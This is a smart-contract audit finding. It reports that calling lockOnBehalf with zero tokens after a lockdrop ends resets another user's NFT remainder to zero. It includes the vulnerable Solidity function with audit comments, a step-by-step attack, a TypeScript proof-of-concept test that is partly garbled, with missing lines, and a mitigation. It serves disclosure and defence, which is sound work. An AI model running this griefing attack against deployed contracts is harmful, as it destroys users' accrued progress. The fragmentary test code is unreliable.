# Vulnerability details

## Impact
Users can stake their tokens to be eligible for NFT reveals when the lockdrop period is active.

When a user deposits some tokens or Ether but doesn't meet the price of the NFT, the protocol increments a `remainder` variable on the `lockedToken` struct. This allows them to get the NFT the next time they deposit enough.

The protocol also introduces a mechanism for other users to lock tokens on behalf of another user (`lockOnBehalf`). However, this functionality creates an attack vector where a malicious user could call `lockOnBehalf()` with 0 tokens and reset the victim's remainder to 0 when the lockdrop is over. Essentially, this would make the victim lose their progress towards the NFT reveal.

## Proof of Concept
Let's assume the following the victim has already locked 5 tokens, when the cost of an NFT is 3 tokens, so he already revelead 1 nft and has a `lockedToken.remainder` of 2 tokens. However, the lockdrop is over but his progress is saved and next time he locks 1 additional token and the lockdrop is active he will get a reveal. 

The attacker could do the following:

1. Monitor when a lockdrop is over. 

2. Check if victim has a reminder using `getLocked()`

3. The attacker calls `lockOnBehalf()` and passes the user's address as `_onBehalfOf` argument and as `_quantity` he passes 0.

```solidity
 function _lock(
        address _tokenContract,
        uint256 _quantity,
        address _tokenOwner,
        address _lockRecipient
    ) private {
       
        ...

        //@audit here we get the lockedToken internal accounting for the user
        LockedToken storage lockedToken = lockedTokens[_lockRecipient][
            _tokenContract
        ];
        ConfiguredToken storage configuredToken = configuredTokens[
            _tokenContract
        ];

       
        accountManager.forceHarvest(_lockRecipient);

        uint256 quantity = _quantity + lockedToken.remainder;

        //@audit this remainder is set to 0 because of reinitialization
        uint256 remainder;
        uint256 numberNFTs;
        uint32 _lockDuration = playerSettings[_lockRecipient].lockDuration;

        if (_lockDuration == 0) {
            _lockDuration = lockdrop.minLockDuration;
        }

        //@audit we skip this block of code because lockdrop is over
        if (
            lockdrop.start <= uint32(block.timestamp) &&
            lockdrop.end >= uint32(block.timestamp)
        ) {
            if (
                _lockDuration < lockdrop.minLockDuration ||
                _lockDuration >
                uint32(configStorage.getUint(StorageKey.MaxLockDuration))
            ) revert InvalidLockDurationError();
            if (msg.sender != address(migrationManager)) {
                // calculate number of nfts

                remainder = quantity % configuredToken.nftCost;
                numberNFTs = (quantity - remainder) / configuredToken.nftCost;

                if (numberNFTs > type(uint16).max) revert TooManyNFTsError();

                // Tell nftOverlord that the player has new unopened Munchables
                nftOverlord.addReveal(_lockRecipient, uint16(numberNFTs));
            }
        }

      
        if (_tokenContract != address(0)) {
            IERC20 token = IERC20(_tokenContract);
            token.transferFrom(_tokenOwner, address(this), _quantity);
        }

        //@audit the lockedToken.remainder of the user is set to 0
        lockedToken.remainder = remainder;
        lockedToken.quantity += _quantity;
        lockedToken.lastLockTime = uint32(block.timestamp);
        lockedToken.unlockTime =
            uint32(block.timestamp) +
            uint32(_lockDuration);

       
        playerSettings[_lockRecipient].lockDuration = _lockDuration;

        emit Locked(
            _lockRecipient,
            _tokenOwner,
            _tokenContract,
            _quantity,
            remainder,
            numberNFTs,
            _lockDuration
        );
    }

```

 describe("when lockdrop is active", () => {
        beforeEach(async () => {

                end: Number(block.timestamp + lockDuration),

            ]);

          await assertTxSuccess({ txHash });
        });
        it("a malicious user can set other user's reminder to 0", async () => {

          // Locking 2e18 tokens while lockdrop is active and nftCost is 3e18 
          const { request: lockRequest } = await testContracts.lockManager.contract.simulate.lock(
            [testERC20Contract.address, parseEther("2")],
            { account: alice, value: 0n }
          );
          const lockTxHash = await testClient.writeContract(lockRequest);
          await assertLockSuccess({
            testContracts,
            testERC20Contract,
            numberNFTs: 0n,
            player: alice,
            quantity: parseEther("2"),
            lockedQuantity: parseEther("2"),

            sender: alice,
            tokenContractAddress: testERC20Contract.address,
            txHash: lockTxHash,
          });
          // advancing time so lockdrop is over
          const block = await testClient.getBlock();
          await testClient.setNextBlockTimestamp({
            timestamp: BigInt(block.timestamp + lockDuration + 1n),
          });
          await testClient.mine({ blocks: 1 });
    
          // malicious user locking 0 on behalf of alice and resetting her reminder to 0
          const { request } = await testContracts.lockManager.contract.simulate.lockOnBehalf(

            quantity: 0n,
            lockedQuantity: parseEther("2"),
            remainder: 0n, // reminder is now reset to 0
            sender: bob,
            tokenContractAddress: testERC20Contract.address,
            txHash,
          });
        });
      });

## Recommended Mitigation Steps
The easiest way to mitigate this is to keep track of the remainder and only set it to 0 when it is spent.
